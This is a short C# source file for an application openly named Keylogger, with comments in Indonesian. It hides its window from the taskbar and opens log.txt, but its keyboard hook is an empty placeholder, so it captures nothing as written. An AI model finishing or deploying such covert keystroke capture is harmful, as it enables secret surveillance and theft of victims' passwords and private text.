using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyloggerApp
{
    public class Keylogger : Form
    {
        private static StreamWriter sw;

        public Keylogger()
        {
            // Sembunyikan form
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            this.Load += Keylogger_Load;
        }

        private void Keylogger_Load(object sender, EventArgs e)
        {
            sw = new StreamWriter("log.txt", true);
            HookKeyboard();
        }

        private void HookKeyboard()
        {
            // Implementasi hook keyboard di sini
            // Ini adalah placeholder; implementasi sebenarnya memerlukan interop dengan Windows API
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            sw.Close();
            base.OnFormClosing(e);
        }
    }
}
